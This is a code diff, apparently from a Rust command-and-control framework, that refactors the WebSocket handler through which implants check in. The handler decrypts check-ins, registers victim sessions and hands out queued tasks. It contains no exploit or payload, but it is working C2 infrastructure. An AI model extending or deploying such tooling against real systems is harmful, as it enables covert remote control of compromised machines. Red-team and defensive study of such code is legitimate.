@@ -12,8 +12,9 @@ use axum::response::IntoResponse;
 use chacha20poly1305::aead::{Aead, KeyInit};
 use chacha20poly1305::{ChaCha20Poly1305, Nonce};
 
-use specter_common::checkin::{CheckinRequest, CheckinResponse, PendingTaskPayload};
-
+use super::checkin_processor::{
+    parse_plaintext_checkin, process_checkin, CheckinOptions, SessionBinding,
+};
 use super::HttpState;
 
 // Wire protocol constants (same as beacon handler)
@@ -53,11 +54,7 @@ async fn handle_ws_connection(mut socket: WebSocket, state: HttpState) {
                 let response = process_ws_beacon(&data, &state).await;
                 match response {
                     Some(resp_data) => {
-                        if socket
-                            .send(Message::Binary(resp_data))
-                            .await
-                            .is_err()
-                        {
+                        if socket.send(Message::Binary(resp_data)).await.is_err() {
                             break;
                         }
                     }
@@ -119,9 +116,10 @@ async fn process_ws_beacon(data: &[u8], state: &HttpState) -> Option<Vec<u8>> {
     let tag = &data[tag_start..tag_end];
 
     // Derive session key using the same approach as the beacon handler
-    let (session_key, _session_id, implant_pubkey) = super::derive_session_key(state, implant_id_prefix)
-        .await
-        .ok()?;
+    let (session_key, _session_id, implant_pubkey) =
+        super::derive_session_key(state, implant_id_prefix)
+            .await
+            .ok()?;
 
     // Decrypt
     let cipher = ChaCha20Poly1305::new_from_slice(&session_key).ok()?;
@@ -138,74 +136,31 @@ async fn process_ws_beacon(data: &[u8], state: &HttpState) -> Option<Vec<u8>> {
         &implant_id_prefix[..4]
     );
 
-    // Parse decrypted JSON check-in
-    let checkin_req: CheckinRequest = serde_json::from_slice(&plaintext).ok()?;
-
-    // Register or update session
-    let session_id = match &_session_id {
-        Some(id) => {
-            if let Err(e) = state.session_manager.update_checkin(id).await {
-                tracing::error!("WS beacon update error: {e}");
-            }
-            id.clone()
-        }
-        None => state
-            .session_manager
-            .register_or_update_with_pubkey(
-                &checkin_req.hostname,
-                &checkin_req.username,
-                checkin_req.pid,
-                &checkin_req.os_version,
-                &checkin_req.integrity_level,
-                &checkin_req.process_name,
-                &checkin_req.internal_ip,
-                &checkin_req.external_ip,
-                &implant_pubkey,
-            )
-            .await
-            .ok()?,
+    let parsed = parse_plaintext_checkin(&plaintext)?;
+    let binding = match _session_id {
+        Some(id) => SessionBinding::Existing(id),
+        None => SessionBinding::ImplantPubkey(implant_pubkey),
     };
 
-    // Process task results
-    for tr in &checkin_req.task_results {
-        let success = tr.status == "COMPLETE";
-        if let Err(e) = state
-            .task_dispatcher
-            .complete_task(&tr.task_id, tr.result.as_bytes(), success)
-            .await
-        {
-            tracing::warn!("WS: failed to complete task {}: {e}", tr.task_id);
-        }
-    }
+    let processed = process_checkin(
+        state,
+        parsed.request,
+        parsed.is_binary,
+        binding,
+        CheckinOptions {
+            defer_module_payloads: false,
+        },
+    )
+    .await
+    .ok()?;
 
-    // Fetch pending tasks
-    let pending = state
-        .task_dispatcher
-        .get_pending_tasks(&session_id)
-        .await
-        .unwrap_or_default();
-
-    let mut tasks_payload = Vec::new();
-    for t in &pending {
-        let _ = state.task_dispatcher.mark_dispatched(&t.id).await;
-        tasks_payload.push(PendingTaskPayload {
-            task_id: t.id.clone(),
-            task_type: t.task_type.clone(),
-            arguments: t.arguments.clone(),
-        });
-    }
-
-    let resp = CheckinResponse {
-        session_id,
-        tasks: tasks_payload,
-    };
-
-    // Serialize and encrypt response
-    let resp_json = serde_json::to_vec(&resp).ok()?;
+    let response_payload = processed.response_bytes().ok()?;
 
     let resp_nonce_bytes: [u8; 12] = rand::random();
     let resp_nonce = Nonce::from_slice(&resp_nonce_bytes);
-    let encrypted = cipher.encrypt(resp_nonce, resp_json.as_slice()).ok()?;
+    let encrypted = cipher
+        .encrypt(resp_nonce, response_payload.as_slice())
+        .ok()?;
 
     // Build wire response
     let ct_part_len = encrypted.len() - WIRE_TAG_SIZE;
